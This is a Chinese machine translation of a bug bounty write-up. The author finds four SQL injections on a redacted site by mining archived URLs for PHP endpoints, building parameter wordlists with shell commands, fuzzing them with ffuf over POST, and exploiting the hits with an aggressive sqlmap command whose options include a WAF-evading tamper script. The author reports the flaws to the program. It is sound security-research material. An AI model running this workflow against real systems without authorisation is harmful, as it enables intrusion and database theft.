<html>
<head>
<title>How I Found multiple SQL Injection with FFUF and Sqlmap in a few minutes</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">我如何在几分钟内用FFUF和Sqlmap找到多个SQL注入</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-2824cd4dfab?source=collection_archive---------0-----------------------#2021-12-14">https://infosecwriteups.com/how-i-found-multiple-sql-injection-with-ffuf-and-sqlmap-in-a-few-minutes-2824cd4dfab?source=collection_archive---------0-----------------------#2021-12-14</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="71e1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">大家好，希望你们没事。我们今天的旅程是关于我如何在短短几分钟内用一种很酷的技术在一个bug bounty程序中发现多个SQL注入。让我们开始，称我们的目标为redacted.org。</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi kl"><img src="../Images/23b3c739790ab1702fe0cc790c091ce2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1360/format:webp/1*7CgvSF7IuL_92eMy7GZ3bg.png"/></div></figure><h1 id="2664" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">枚举阶段:</h1><p id="aa54" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">我开始用<a class="ae lw" href="https://github.com/tomnomnom/waybackurls" rel="noopener ugc nofollow" target="_blank"> waybackurls </a>工具查看目标的web档案，我发现了一堆端点，但是我观察到了很多PHP文件！！嗯，也许我会在其中一个中找到SQL注入，好的，让我们过滤输出。所以我的命令是:</p><pre class="km kn ko kp gt lx ly lz ma aw mb bi"><span id="edfe" class="mc ku iq ly b gy md me l mf mg">waybackurls https://redacted.org/ | uro | grep “.php” &gt; php-files.txt</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mh"><img src="../Images/bbaa418e14381db40beb4d5881fbca62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jsIrhJ_LkMLEKBIuBDcdhQ.png"/></div></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">uro是一个用来删除重复网址的工具</figcaption></figure><p id="6064" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，我们有很多PHP文件，让我们看看其中的一些</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/88a7350630c5e764e54d6cad666c771c.png" data-original-src="https://miro.medium.com/v2/resize:fit:982/format:webp/1*wc6ST5wnkVutMz4JHP80Zw.png"/></div></figure><p id="0f58" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Mmmmmm，PHP文件名看起来很有趣，我想它可以帮助我找到参数。好了，让我们在<em class="mr">得到</em>之后，做一些尝试来整理名字，以制作一个在端点中暴力破解的参数列表。让我们goooo</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="ms mt l"/></div></figure><h1 id="bb08" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">获取参数:</h1><p id="2950" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">首先，我们只需要grep包含<em class="mr"> get </em>字符串的行，并删除它之前的所有内容，使其唯一以避免重复，因此我们的命令将是:</p><pre class="km kn ko kp gt lx ly lz ma aw mb bi"><span id="a4c3" class="mc ku iq ly b gy md me l mf mg">$ <strong class="ly ir">cat php-files.txt| grep -i get | sed 's/.*.get//' | sort -u</strong></span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mu"><img src="../Images/e62ef4b4941abf1aa123f84c5a8183c2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*35-W8R6CHPnZYX3UUiKoPA.png"/></div></div></figure><p id="deb7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好极了。！我做到了，但是我们应该去掉<strong class="jp ir">。php </strong>字符串来制作一个列表，所以我只是将该行添加到最后一个命令<strong class="jp ir"> <em class="mr"> cut -f1 -d " . "</em>T13】</strong></p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mv"><img src="../Images/aa64a02452b09cc067bfea70bb770c2e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Vh7QDGgJNqhmHuSCYq9jDQ.png"/></div></div></figure><p id="49e5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，我们差不多完成了，我注意到所有的字符串都包含了两个单词，我不知道哪一个是参数，所以我们把它分开吧！！！老实说，我不知道怎么做，所以我做了一些关于这个操作的搜索，直到我看到这个，我找到了我想要的！！附加命令将是</p><pre class="km kn ko kp gt lx ly lz ma aw mb bi"><span id="a5dd" class="mc ku iq ly b gy md me l mf mg"><strong class="ly ir">sed 's/[A-Z]\+/\n&amp;/g'</strong></span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mh"><img src="../Images/0ccbce181317d3e124af108a44672914.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-HfOZD6m1ulZLeQXIhY2Qw.png"/></div></div></figure><p id="d29a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尼利斯。！好的，但是我认为大部分参数是小写的，而不是大写的，所以我将保持大写参数，并将其转换为小写，我将测试这两个参数；)</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mh"><img src="../Images/488b0aa74b6a489abc5ec9199c61ff79.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nhp7msmiV83WJzUYOGzcUQ.png"/></div></div></figure><p id="8c3a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在我们有了两个参数列表，让我们用FFUF测试它，首先，我将grep endpoint并使用它测试所有参数，我将首先使用以下命令尝试小写参数:</p><pre class="km kn ko kp gt lx ly lz ma aw mb bi"><span id="dfa0" class="mc ku iq ly b gy md me l mf mg">ffuf -w lowercase-parameters.txt -u "https://redacted.org/searchProgressCommitment.php?FUZZ=5"</span></pre><p id="ab31" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但可悲的是我一无所获</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="ms mt l"/></div></figure><p id="54cc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">老实说，我在那之后变得沮丧，但我的脑海中出现了一个想法，将请求方法改为帖子怎么样！我迅速找到我的VPS并改变了方法，</p><pre class="km kn ko kp gt lx ly lz ma aw mb bi"><span id="3b67" class="mc ku iq ly b gy md me l mf mg">ffuf -w lowercase-parameters.txt -X POST -d "FUZZ=5" -u "https://redacted.org/searchProgressCommitment.php"</span></pre><p id="e91c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">结果我得到了<strong class="jp ir">承诺&amp; id </strong>参数</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="ms mt l"/></div></figure><p id="c249" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">好了，现在转到端点，用burp拦截请求，更改请求方法，添加参数，并将其复制到txt文件，以便在其上运行sqlmap。</p><h1 id="6a63" class="kt ku iq bd kv kw kx ky kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq bi translated">剥削:</h1><p id="f6c9" class="pw-post-body-paragraph jn jo iq jp b jq lr js jt ju ls jw jx jy lt ka kb kc lu ke kf kg lv ki kj kk ij bi translated">该命令将是:</p><pre class="km kn ko kp gt lx ly lz ma aw mb bi"><span id="08e7" class="mc ku iq ly b gy md me l mf mg"><strong class="ly ir">sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast</strong></span></pre><p id="b5c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi">— — — — — — — — — — — — — — — — — — — — — — — — — —</p><pre class="km kn ko kp gt lx ly lz ma aw mb bi"><span id="fca8" class="mc ku iq ly b gy md me l mf mg">--level 5 --&gt; Level of tests to perform.<br/>--risk 3 --&gt; Risk of tests to perform<br/>--dbms --&gt; back-end DBMS value<br/>--no-cast --&gt; to avoid use cast-alike statements during data fetching<br/>--tamber --&gt; to evade filters and WAF’s<br/>"--hostname --current-user --current-db --dbs" --&gt; to retrieve info about the database</span></pre><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mw"><img src="../Images/8e786735696732295ff5c2ed694fb824.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MttqWNSUL5638cr83XxQUA.png"/></div></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">第一名SQLI</figcaption></figure><p id="dee2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我做到了！！！！！！！</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="ms mt l"/></div></figure><p id="ec68" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在让我们用其他端点来尝试这种方式；)</p><p id="02bf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我选择了一些端点并使用了相同的FFUF命令，当然还有POST方法。</p><p id="01c7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">答对了。！我从列表中找到了三个具有有效参数的端点。</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="ms mt l"/></div></figure><p id="c789" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第二个SQLI:带有<strong class="jp ir"> id </strong>参数的ws_delComment.php</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mw"><img src="../Images/c1b1337f2c4441bc3ffbbd998f3882e5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dKmEJUvM0nekyMsT2kzxJA.png"/></div></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">第二名SQLI</figcaption></figure><p id="f843" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第三名:getTargets.php与SQLI<strong class="jp ir">目标</strong>参数</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mw"><img src="../Images/bf1d8b1ec8a7196110c55cbae2e4d37d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*29r9MDxykEsbKocUx-chhw.png"/></div></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">第三届SQLI</figcaption></figure><p id="dd71" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">第四个:带有<strong class="jp ir">列表</strong>参数的mailing_lists.php</p><figure class="km kn ko kp gt kq gh gi paragraph-image"><div role="button" tabindex="0" class="mi mj di mk bf ml"><div class="gh gi mw"><img src="../Images/0e1ac923113f972c4ef0907e25d232d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oK9N2DI1eCh2CdL3vwfyfA.png"/></div></div><figcaption class="mm mn gj gh gi mo mp bd b be z dk translated">第四名SQLI</figcaption></figure><p id="50ac" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">非常好，我们得到了四次SQL注入:)</p><figure class="km kn ko kp gt kq"><div class="bz fp l di"><div class="ms mt l"/></div></figure><p id="5c5c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我向安全团队报告了所有SQL注入，他们批准了，他们正在努力解决问题！！</p><p id="b5c9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">感谢阅读，干杯！</p><p id="aa8b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如有任何问题或反馈，在<a class="ae lw" href="https://twitter.com/0xmahmoudJo0" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> Twitter </strong> </a>上dm我。</p></div></div>    
</body>
</html>